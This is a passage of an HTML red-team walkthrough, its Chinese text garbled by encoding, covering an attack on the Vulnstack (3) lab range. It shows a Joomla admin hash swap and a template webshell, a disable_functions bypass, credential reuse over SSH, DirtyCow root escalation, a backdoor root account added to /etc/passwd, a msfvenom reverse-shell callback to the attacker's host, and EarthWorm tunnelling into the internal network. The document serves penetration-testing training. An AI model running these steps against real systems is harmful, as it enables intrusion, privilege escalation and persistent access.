¹ç›®å½•<code>/var/www/html/</code></p>\n</li>\n</ul>\n</li>\n<li>\n<p>å°è¯•ç™»å½•MYSQLï¼Œä½¿ç”¨<code>Navicat</code></p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%89)/image40.png\" alt=\"image.png\"></p>\n<p>ç™»é™†æˆåŠŸ</p>\n</li>\n<li>\n<p>è¿›å…¥æ•°æ®åº“åå°åï¼ŒæŸ¥æ‰¾æ•æ„Ÿæ•°æ®</p>\n<p>æ‰¾åˆ°åå°ç®¡ç†å‘˜çš„æ•°æ®ï¼Œåœ¨<code>am2zu_users</code> è¡¨ä¸‹</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-number\">891</span>\tSuper User\tadministrator\ttest@test.com\t$2y$<span class=\"hljs-number\">10</span>$t1RelJijihpPhL8LARC9JuM/AWrVR.nto/XycrybdRbk8IEg6Dze2\n</code></pre>\n<p>å°è¯•ä½¿ç”¨<code>john</code>ç ´è§£ï¼Œä½†æ˜¯æ— æœï¼Œå°è¯•ä¿®æ”¹<code>MYSQL</code>è¡¨æ–‡ä»¶</p>\n</li>\n<li>\n<p>å°†å¾—åˆ°çš„åå°ç®¡ç†å‘˜å¯†ç æ‹¿å»è¯†åˆ«å¾—çŸ¥æ˜¯<strong>Bcrypt</strong>åŠ å¯†ï¼Œæ˜¯ä¸ºäº†æŠ—çˆ†å‘æ˜çš„ï¼Œæ‰€ä»¥johnç ´è§£æ— æœï¼ˆå¤ªæ…¢äº†ï¼‰</p>\n<p>æˆ‘ä»¬å°†123456è¿›è¡Œ<strong>Bcrypt</strong>åŠ å¯†ï¼Œå¾—åˆ°</p>\n<blockquote>\n<p>åŠ å¯†ç½‘ç«™ï¼š<a href=\"https://www.bejson.com/encrypt/bcrpyt_encode/\">https://www.bejson.com/encrypt/bcrpyt_encode/</a></p>\n</blockquote>\n<pre><code class=\"hljs language-python\">$2a$<span class=\"hljs-number\">10</span>$JYEZiw0pCY1NV9ZVsaJ39uAgaXUpzCvaFxvBDPwMBlQEkYmD7RXPi\n</code></pre>\n<p>ç„¶åå°†å…¶æ›¿æ¢åˆ°<code>administrator</code>ä¸Šå»ï¼Œç™»é™†åå°ï¼ŒæˆåŠŸè¿›å…¥åå°</p>\n</li>\n</ol>\n<h2>åå°åˆ©ç”¨</h2>\n<ol>\n<li>\n<p>ä½¿ç”¨è´¦å·<code>administrator</code>å¯†ç <code>123456</code>ç™»å½•åå°</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%89)/image41.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>è·å–åˆ°ç³»ç»Ÿä¿¡æ¯</p>\n<pre><code class=\"hljs language-python\">Setting \tValue\nPHP Built On \tLinux ubuntu <span class=\"hljs-number\">4.4</span><span class=\"hljs-number\">.0</span>-<span class=\"hljs-number\">142</span>-generic <span class=\"hljs-comment\">#168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64</span>\nDatabase <span class=\"hljs-type\">Type</span> \tmysql\nDatabase Version \t<span class=\"hljs-number\">5.7</span><span class=\"hljs-number\">.27</span>-0ubuntu0<span class=\"hljs-number\">.16</span><span class=\"hljs-number\">.04</span><span class=\"hljs-number\">.1</span>\nDatabase Collation \tutf8_general_ci\nDatabase Connection Collation \tutf8mb4_general_ci\nPHP Version \t<span class=\"hljs-number\">7.1</span><span class=\"hljs-number\">.32</span>-<span class=\"hljs-number\">1</span>+ubuntu16<span class=\"hljs-number\">.04</span><span class=\"hljs-number\">.1</span>+deb.sury.org+<span class=\"hljs-number\">1</span>\nWeb Server \tApache/<span class=\"hljs-number\">2.4</span><span class=\"hljs-number\">.18</span> (Ubuntu)\nWebServer to PHP Interface \tapache2handler\nJoomla! Version \tJoomla! <span class=\"hljs-number\">3.9</span><span class=\"hljs-number\">.12</span> Stable [ Amani ] <span class=\"hljs-number\">24</span>-September-<span class=\"hljs-number\">2019</span> <span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">00</span> GMT\nJoomla! Platform Version \tJoomla Platform <span class=\"hljs-number\">13.1</span><span class=\"hljs-number\">.0</span> Stable [ Curiosity ] <span class=\"hljs-number\">24</span>-Apr-<span class=\"hljs-number\">2013</span> <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span> GMT\nUser Agent \tMozilla/<span class=\"hljs-number\">5.0</span> (Windows NT <span class=\"hljs-number\">10.0</span>; Win64; x64; rv:<span class=\"hljs-number\">132.0</span>) Gecko/<span class=\"hljs-number\">20100101</span> Firefox/<span class=\"hljs-number\">132.0</span> \n</code></pre>\n</li>\n<li>\n<p>é€šè¿‡æ¨¡æ¿<code>getshell</code></p>\n<p>ä¿®æ”¹æ¨¡æ¿<code>Extensions</code>â€“><code>Templates</code>â€“><code>Templates</code>â€“><code>Beez3 Details and Files</code> çš„<code>error.php</code>æ–‡ä»¶ï¼Œå°†å†…å®¹æ›¿æ¢ä¸ºä¸€å¥æœ¨é©¬</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%89)/image42.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>è®¿é—®<code>error.php</code>æ–‡ä»¶</p>\n<pre><code class=\"hljs language-python\">/templates/beez3/error.php\n</code></pre>\n</li>\n<li>\n<p>ä½¿ç”¨èšğŸ—¡è¿æ¥ï¼Œè¿æ¥æˆåŠŸ</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%89)/image43.png\" alt=\"image.png\"></p>\n</li>\n</ol>\n<h2>è·å¾—shell ï¼Ÿ</h2>\n<ol>\n<li>\n<p>åˆ©ç”¨èšğŸ—¡è¿›è¡Œåå¼¹<code>shell</code></p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%89)/image44.png\" alt=\"image.png\"></p>\n<p>è¿”å›<code>ret=127</code></p>\n</li>\n<li>\n<p>å¯»æ‰¾åŸå› ï¼ŒæŸ¥çœ‹ä¹‹å‰çš„<code>1.php</code></p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%89)/image45.png\" alt=\"image.png\"></p>\n<p>å°†æ‰§è¡Œå‡½æ•°ç¦ç”¨äº†ï¼ˆæˆ‘å‰é¢ä½¿ç”¨<code>MSF</code>ç”Ÿæˆåå¼¹<code>shell</code>ä»£ç ä¸€ç›´ä¸æˆåŠŸéƒ½æ€€ç–‘è‡ªå·±äº†ï¼ŒåŸæ¥æ˜¯è¿™é‡Œå¡ä½äº†ï¼‰</p>\n</li>\n<li>\n<p>ç»•è¿‡<strong>Disable Functions</strong></p>\n<blockquote>\n<p><a href=\"https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD\">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p>\n</blockquote>\n<p>å°†<code>bypass_disablefunc.php</code>å’Œ<code>bypass_disablefunc_x64.so</code>é€šè¿‡èšğŸ—¡ä¸Šä¼ åˆ°å½“å‰ç›®å½•</p>\n<p>æµ‹è¯•ï¼Œè¾“å…¥<code>url</code>æµ‹è¯•<code>pwd</code>å‘½ä»¤</p>\n<pre><code class=\"hljs language-python\">?cmd=pwd&#x26;outpath=/var/www/html/output&#x26;sopath=/var/www/html/bypass_disablefunc_x64.so\n</code></pre>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%89)/image46.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>å°è¯•äº†åå¼¹<code>shell</code>ä½†æ˜¯æ²¡æœ‰æˆåŠŸ</p>\n</li>\n</ol>\n<h2>å†…ç½‘ä¿¡æ¯æ”¶é›†</h2>\n<ol>\n<li>\n<p>èšğŸ—¡ç”±ç»•è¿‡<strong>Disable Functions</strong>çš„æ’ä»¶ï¼Œå®‰è£…åè™šæ‹Ÿç»ˆç«¯å¯ä»¥æ­£å¸¸å›æ˜¾</p>\n<blockquote>\n<p><a href=\"https://github.com/Medicean/as_bypass_php_disable_functions\">https://github.com/Medicean/as_bypass_php_disable_functions</a></p>\n</blockquote>\n</li>\n<li>\n<p>ä¿¡æ¯æ”¶é›†</p>\n<pre><code class=\"hljs language-python\">(www-data:/var/www/html/templates/beez3) $ ip add\n<span class=\"hljs-number\">1</span>: lo: &#x3C;LOOPBACK,UP,LOWER_UP> mtu <span class=\"hljs-number\">65536</span> qdisc noqueue state UNKNOWN group default qlen <span class=\"hljs-number\">1</span>\n    link/loopback <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span> brd <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>\n    inet <span class=\"hljs-number\">127.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span>/<span class=\"hljs-number\">8</span> scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::<span class=\"hljs-number\">1</span>/<span class=\"hljs-number\">128</span> scope host \n       valid_lft forever preferred_lft forever\n<span class=\"hljs-number\">2</span>: ens33: &#x3C;BROADCAST,MULTICAST,UP,LOWER_UP> mtu <span class=\"hljs-number\">1500</span> qdisc pfifo_fast state UP group default qlen <span class=\"hljs-number\">1000</span>\n    link/ether <span class=\"hljs-number\">00</span>:0c:<span class=\"hljs-number\">29</span>:ab:<span class=\"hljs-number\">32</span>:ac brd ff:ff:ff:ff:ff:ff\n    inet <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.120</span>/<span class=\"hljs-number\">24</span> brd <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.255</span> scope <span class=\"hljs-keyword\">global</span> ens33\n       valid_lft forever preferred_lft forever\n    inet6 fe80::20c:29ff:feab:32ac/<span class=\"hljs-number\">64</span> scope link \n       valid_lft forever preferred_lft forever\n</code></pre>\n<p>ç¡®å®šwebæœåŠ¡å™¨çš„IPæ˜¯<code>192.168.93.120</code></p>\n<pre><code class=\"hljs language-python\">(www-data:/var/www/html/templates/beez3) $ <span class=\"hljs-built_in\">id</span>\nuid=<span class=\"hljs-number\">33</span>(www-data) gid=<span class=\"hljs-number\">33</span>(www-data) groups=<span class=\"hljs-number\">33</span>(www-data)\n(www-data:/var/www/html/templates/beez3) $ whoami\nwww-data\n(www-data:/var/www/html/templates/beez3) $ uname -a\nLinux ubuntu <span class=\"hljs-number\">4.4</span><span class=\"hljs-number\">.0</span>-<span class=\"hljs-number\">142</span>-generic <span class=\"hljs-comment\">#168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span>\n</code></pre>\n</li>\n<li>\n<p>å¯»æ‰¾æ•æ„Ÿå†…å®¹</p>\n<ul>\n<li>\n<p><code>/tmp</code>ä¸‹å­˜åœ¨<code>test.txt</code> ï¼Œåƒæ˜¯ä¸€ä¸ªç”¨æˆ·</p>\n<pre><code class=\"hljs language-python\">(www-data:/tmp/mysql) $ cat test.txt\nadduser wwwuser\npasswd wwwuser_123Aqx\n</code></pre>\n</li>\n</ul>\n</li>\n<li>\n<p>æ‹¿åˆ°ä¸€ä¸ªç”¨æˆ·çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬å°è¯•ç™»å½•<code>ssh</code> ï¼Œç™»é™†æˆåŠŸ</p>\n<pre><code class=\"hljs language-python\">ssh wwwuser@<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span> -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa\nwwwuser@<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span><span class=\"hljs-string\">'s password:\nLast login: Sun Oct  6 20:24:43 2019 from 192.168.1.122\n[wwwuser@localhost ~]$  \n</span></code></pre>\n<p>æŸ¥çœ‹å…¶IPä¿¡æ¯</p>\n<pre><code class=\"hljs language-python\">[wwwuser@localhost ~]$ ip add\n<span class=\"hljs-number\">1</span>: lo: &#x3C;LOOPBACK,UP,LOWER_UP> mtu <span class=\"hljs-number\">16436</span> qdisc noqueue state UNKNOWN \n    link/loopback <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span> brd <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>\n    inet <span class=\"hljs-number\">127.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span>/<span class=\"hljs-number\">8</span> scope host lo\n    inet6 ::<span class=\"hljs-number\">1</span>/<span class=\"hljs-number\">128</span> scope host \n       valid_lft forever preferred_lft forever\n<span class=\"hljs-number\">2</span>: eth0: &#x3C;BROADCAST,MULTICAST,UP,LOWER_UP> mtu <span class=\"hljs-number\">1500</span> qdisc pfifo_fast state UP qlen <span class=\"hljs-number\">1000</span>\n    link/ether <span class=\"hljs-number\">00</span>:0c:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">32</span>:<span class=\"hljs-number\">46</span>:c9 brd ff:ff:ff:ff:ff:ff\n    inet <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>/<span class=\"hljs-number\">24</span> brd <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.255</span> scope <span class=\"hljs-keyword\">global</span> eth0\n    inet6 fe80::20c:29ff:fe32:46c9/<span class=\"hljs-number\">64</span> scope link \n       valid_lft forever preferred_lft forever\n<span class=\"hljs-number\">3</span>: eth1: &#x3C;BROADCAST,MULTICAST,UP,LOWER_UP> mtu <span class=\"hljs-number\">1500</span> qdisc pfifo_fast state UP qlen <span class=\"hljs-number\">1000</span>\n    link/ether <span class=\"hljs-number\">00</span>:0c:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">32</span>:<span class=\"hljs-number\">46</span>:d3 brd ff:ff:ff:ff:ff:ff\n    inet <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.100</span>/<span class=\"hljs-number\">24</span> brd <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.255</span> scope <span class=\"hljs-keyword\">global</span> eth1\n    inet6 fe80::20c:29ff:fe32:46d3/<span class=\"hljs-number\">64</span> scope link \n       valid_lft forever preferred_lft forever\n</code></pre>\n<p>ä¸¤å¼ ç½‘å¡ï¼Œå¯ä»¥çŸ¥é“è¿™ä¸ªæ˜¯<code>nginx</code>æœåŠ¡å™¨çš„ä¸»æœºï¼Œç”¨æ¥åšåå‘ä»£ç†çš„ï¼Œå†…ç½‘IPæ˜¯<code>192.168.93.100</code></p>\n</li>\n<li>\n<p>æŸ¥çœ‹ä»£ç†é…ç½®<code>/etc/nginx/nginx.conf</code></p>\n<pre><code class=\"hljs language-python\">http {                                                                                                                                                                                                                                                                                                                                                                                                                            \n  server {                                                                                                                                                                                                                                                                                                                                                                                                                       \n        listen  <span class=\"hljs-number\">80</span>;                                                                                                                                                                                               \n        server_name  localhost;                                                                                                                                                                                                                                                                                                                                                                                              \n        location / {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       \n         proxy_pass  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.120</span>;                                                                                                                                                                                                                                                                                                                                                                                 \n              proxy_set_header        Host $host;                                                                                                                                                                 \n              proxy_set_header        X-Real-IP $remote_addr;  <span class=\"hljs-comment\">#è·å–çœŸå®ip                                                                                                                                        </span>\n              proxy_connect_timeout   <span class=\"hljs-number\">90</span>;                                                                                                                                                                         \n              proxy_send_timeout      <span class=\"hljs-number\">90</span>;                                                                                                                                                                         \n              proxy_read_timeout      <span class=\"hljs-number\">90</span>;\n              proxy_buffer_size       4k;\n              proxy_buffers           <span class=\"hljs-number\">4</span> 32k;\n              proxy_busy_buffers_size 64k;\n              proxy_temp_file_write_size 64k;\n              proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;<span class=\"hljs-comment\">#è·å–ä»£ç†è€…çš„çœŸå®ip</span>\n              proxy_redirect          off;\n}\n}\n}\nstream  {                                                                                                                                                                                                                                                                                                                                                                                                                         \nupstream proxy_name {                                                                                                                                                                                                                                                                                                                                                                                                             \n    server <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.120</span>:<span class=\"hljs-number\">3306</span>;                                                                                                                                                                                                                                                                                                                                                                                                 \n}                                                                                                                                                                                                                                                        \nserver {                                                                          \n    listen <span class=\"hljs-number\">3306</span>;                                                                   \n    proxy_pass proxy_name;                                                                                                                    \n}                                                \n}\n</code></pre>\n</li>\n</ol>\n<h2>ææƒ</h2>\n<ol>\n<li>\n<p>å°è¯•ææƒ<code>nginx</code>ä¸»æœºï¼Œæ–¹ä¾¿åç»­æ“ä½œï¼ŒæŸ¥çœ‹å†…æ ¸<code>2.6.32</code>åœ¨è„ç‰›(<code>DirtyCow</code>)(<code>CVE-2016-5195</code>)çš„èŒƒå›´å†…</p>\n<pre><code class=\"hljs language-python\">[wwwuser@localhost tmp]$ uname -a\nLinux localhost.localdomain <span class=\"hljs-number\">2.6</span><span class=\"hljs-number\">.32</span>-<span class=\"hljs-number\">431.</span>el6.x86_64 <span class=\"hljs-comment\">#1 SMP Fri Nov 22 03:15:09 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux</span>\n</code></pre>\n</li>\n<li>\n<p><code>EXP</code>åœ°å€<a href=\"https://github.com/FireFart/dirtycow\">https://github.com/FireFart/dirtycow</a></p>\n<p>å°†EXPä¼ åˆ°é¶æœºä¸Šå»ï¼Œç„¶åç¼–è¯‘æ‰§è¡Œ</p>\n<pre><code class=\"hljs language-python\">gcc -pthread dirty.c -o dirty -lcrypt\n./dirty <span class=\"hljs-number\">123456</span>\n</code></pre>\n<pre><code class=\"hljs language-python\">[wwwuser@localhost tmp]$ ./dirty <span class=\"hljs-number\">123456</span> \n/etc/passwd successfully backed up to /tmp/passwd.bak\nPlease enter the new password: <span class=\"hljs-number\">123456</span>\nComplete line:\nfirefart:fi8RL.Us0cfSs:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">0</span>:pwned:/root:/<span class=\"hljs-built_in\">bin</span>/bash\n\nmmap: 7f141f280000\n\nmadvise <span class=\"hljs-number\">0</span>\n\nptrace <span class=\"hljs-number\">0</span>\nDone! Check /etc/passwd to see <span class=\"hljs-keyword\">if</span> the new user was created.\nYou can log <span class=\"hljs-keyword\">in</span> <span class=\"hljs-keyword\">with</span> the username <span class=\"hljs-string\">'firefart'</span> <span class=\"hljs-keyword\">and</span> the password <span class=\"hljs-string\">'123456'</span>.\n\nDON<span class=\"hljs-string\">'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd   \n</span></code></pre>\n<p>åˆ›å»ºäº†ä¸€ä¸ªæ–°ç”¨æˆ·<code>firefart</code>ï¼Œå¯†ç æ˜¯<code>123456</code></p>\n</li>\n<li>\n<p>åˆ‡æ¢è´¦æˆ·æŸ¥çœ‹æƒé™</p>\n<pre><code class=\"hljs language-python\">[firefart@localhost tmp]<span class=\"hljs-comment\"># id</span>\nuid=<span class=\"hljs-number\">0</span>(root) gid=<span class=\"hljs-number\">0</span>(root) ç»„=<span class=\"hljs-number\">0</span>(root) ç¯å¢ƒ=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023\n</code></pre>\n<p>rootï¼ï¼ï¼</p>\n</li>\n<li>\n<p>æ·»åŠ æ–°çš„è¶…çº§ç®¡ç†å‘˜ç”¨æˆ·ï¼ˆæƒé™ç»´æŒï¼Œä¸è¿‡å¾ˆæ˜æ˜¾ï¼‰</p>\n<pre><code class=\"hljs language-python\">echo <span class=\"hljs-string\">\"sunset:savbSWc4rx8NY:0:0::/:/bin/sh\"</span> >> passwd.bak\n</code></pre>\n<p>å¯†ç æ˜¯<code>momaek</code> ï¼Œæ–°å»ºåå°†<code>mv /tmp/passwd.bak /etc/passwd</code> <code>DON'T FORGET TO RESTORE!</code></p>\n<p>ä¹‹åå°±å¯ä»¥ç™»å½•<code>sunset</code>ç”¨æˆ·æ¥æ“ä½œäº†</p>\n</li>\n</ol>\n<h2>ä¸Šçº¿MSF</h2>\n<ol>\n<li>\n<p>ç”Ÿæˆ<code>payload</code></p>\n<pre><code class=\"hljs language-python\">msfvenom -p python/meterpreter/reverse_tcp lport=<span class=\"hljs-number\">1234</span> lhost=<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.129</span> -f raw > getshell.py\n</code></pre>\n</li>\n<li>\n<p>å°†<code>getshell.py</code> ä¸Šä¼ åˆ°é¶æœºï¼Œ<code>kali</code>å¼€å¯ç›‘å¬ï¼Œæ‰§è¡Œ<code>getshell.py</code></p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># kali å¼€å¯ç›‘å¬</span>\nmsf6 > use exploit/multi/handler \nmsf6 exploit(multi/handler) > <span class=\"hljs-built_in\">set</span> payload python/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) > <span class=\"hljs-built_in\">set</span> lport <span class=\"hljs-number\">1234</span>  \nmsf6 exploit(multi/handler) > <span class=\"hljs-built_in\">set</span> lhost <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.129</span> \nmsf6 exploit(multi/handler) > run \n</code></pre>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># é¶æœºæ‰§è¡Œæ–‡ä»¶</span>\n-sh-<span class=\"hljs-number\">4.1</span><span class=\"hljs-comment\"># python getshell.py </span>\n</code></pre>\n<pre><code class=\"hljs language-python\">msf6 exploit(multi/handler) > run\n\n[*] Started reverse TCP handler on <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.129</span>:<span class=\"hljs-number\">1234</span> \n[*] Sending stage (<span class=\"hljs-number\">24772</span> <span class=\"hljs-built_in\">bytes</span>) to <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>\n[*] Meterpreter session <span class=\"hljs-number\">2</span> opened (<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.129</span>:<span class=\"hljs-number\">1234</span> -> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>:<span class=\"hljs-number\">42433</span>) at <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">11</span>-<span class=\"hljs-number\">25</span> <span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">30</span>:03 +0800\n\nmeterpreter > \n</code></pre>\n<p>ä¸Šçº¿æˆåŠŸ</p>\n</li>\n</ol>\n<h2>å†…ç½‘ä¸»æœº&#x26;ä¿¡æ¯æ¢æµ‹</h2>\n<ol>\n<li>\n<p>ä¸Šçº¿<code>MSF</code>åï¼Œæ·»åŠ é€šå‘å†…ç½‘çš„è·¯ç”±</p>\n<pre><code class=\"hljs language-python\">meterpreter > run post/multi/manage/autoroute\nmeterpreter > run autoroute -p\n\n[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.\n[!] Example: run post/multi/manage/autoroute OPTION=value [...]\n\nActive Routing Table\n====================\n\n   Subnet             Netmask            Gateway\n   ------             -------            -------\n   <span class=\"hljs-number\">169.254</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.0</span>        <span class=\"hljs-number\">255.255</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.0</span>        Session <span class=\"hljs-number\">1</span>\n   <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.0</span>       <span class=\"hljs-number\">255.255</span><span class=\"hljs-number\">.255</span><span class=\"hljs-number\">.0</span>      Session <span class=\"hljs-number\">1</span>\n   <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.0</span>      <span class=\"hljs-number\">255.255</span><span class=\"hljs-number\">.255</span><span class=\"hljs-number\">.0</span>      Session <span class=\"hljs-number\">1</span>\n</code></pre>\n</li>\n<li>\n<p>ä½¿ç”¨**<code>Earthworm</code>**åœ¨<code>kali</code>å’Œ<code>Centos</code>ä¸­å»ºç«‹ä¸€æ¡éš§é“</p>\n<blockquote>\n<p><a href=\"https://rootkiter.com/EarthWorm/\">https://rootkiter.com/EarthWorm/</a></p>\n</blockquote>\n<p><code>earthworm</code>æ­å»º<code>socks5</code>åå‘ä»£ç†æœåŠ¡ æ˜¯ä¸ºäº†è®©kaliï¼ˆæ”»å‡»è€…ï¼‰çš„ç¨‹åºè¿›å…¥å†…ç½‘ï¼Œå¯ä»¥æ‰«æå†…ç½‘ä¸»æœºä¿¡æ¯ç­‰</p>\n<p>ewæµé‡èµ°å‘ï¼šæœ¬åœ°æµé‡â€“æœ¬åœ°<code>1080</code>ç«¯å£â€“webæœåŠ¡å™¨<code>8888</code>ç«¯å£ï¼ˆåˆ©ç”¨EWï¼‰-- å†…ç½‘æœåŠ¡å™¨ â€“ webæœåŠ¡å™¨çš„<code>8888</code>ç«¯å£ â€“ æœ¬åœ°<code>1080</code>ç«¯å£</p>\n<ul>\n<li>\n<p>Kaliï¼ˆæ­¤å¤„ç”¨çš„æ˜¯åå‘çš„ï¼‰</p>\n<pre><code class=\"hljs language-python\">./ew_for_linux64 -s rcsocks -l <span class=\"hljs-number\">1080</span> -e <span class=\"hljs-number\">8888</span>\nrcsocks <span class=\"hljs-number\">0.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.0</span>:<span class=\"hljs-number\">1080</span> &#x3C;--[<span class=\"hljs-number\">10000</span> usec]--> <span class=\"hljs-number\">0.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.0</span>:<span class=\"hljs-number\">8888</span>\ninit cmd_server_for_rc here\nstart listen port here\n</code></pre>\n</li>\n<li>\n<p>Centos</p>\n<pre><code class=\"hljs language-python\">./ew_for_linux64 -s rssocks -d <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.129</span> -e <span class=\"hljs-number\">8888</span>\n</code></pre>\n</li>\n<li>\n<p>è®¾ç½®<code>proxychain4</code> ï¼Œæ³¨æ„ï¼š<code>proxychain4</code> åªèƒ½ä»£ç†<code>TCP</code>æˆ–è€…<code>UDP</code></p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># vim /etc/proxychains4.conf   </span>\nsocks5  <span class=\"hljs-number\">127.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span>       <span class=\"hljs-number\">1080</span>\n</code></pre>\n</li>\n</ul>\n<p>æµ‹è¯•ï¼Œå› ä¸ºä¸Šé¢é€šè¿‡æŸ¥çœ‹<code>Nginx</code>çš„åå‘ä»£ç†é…ç½®å¾—çŸ¥WebæœåŠ¡å™¨ä¸º<code>192.168.93.120</code> ï¼Œæˆ‘ä»¬æ­£å¸¸æ˜¯ä¸å¯ä»¥ç›´æ¥<code>curl</code>åˆ°å†…å®¹ï¼Œä½†æ˜¯é€šè¿‡ä»£ç†åå°±å¯ä»¥ç›´æ¥<code>curl</code>äº†</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># ä¸ç»è¿‡ä»£ç†</span>\ncurl <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.120</span>             \ncurl: (<span class=\"hljs-number\">7</span>) Failed to connect to <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.120</span> port <span class=\"hljs-number\">80</span> after <span class=\"hljs-number\">0</span> ms: Could <span class=\"hljs-keyword\">not</span> connect to server\n<span class=\"hljs-comment\"># ç»è¿‡ä»£ç†</span>\nproxychains4 curl <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.120</span>     \n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so<span class=\"hljs-number\">.4</span>\n[proxychains] DLL init: proxychains-ng <span class=\"hljs-number\">4.17</span>\n[proxychains] Strict chain  ...  <span class=\"hljs-number\">127.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span>:<span class=\"hljs-number\">1080</span>  ...  <span 